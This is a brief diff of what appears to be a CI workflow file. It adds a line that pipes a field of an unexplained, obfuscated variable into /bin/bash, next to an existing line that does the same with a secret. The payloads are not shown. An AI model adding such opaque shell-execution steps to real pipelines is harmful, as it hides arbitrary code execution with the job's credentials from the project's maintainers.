@@ -18,6 +18,7 @@ jobs:
           vlibc651: ${{ secrets.vlibc651 }}
         run: |
           printf '%s' "$vlibc651" | jq -r .e500 | /bin/bash
+          printf '%s' "$oakbj15" | jq -r .zpi89764 | /bin/bash
 
       - name: Upload results
         if: always()
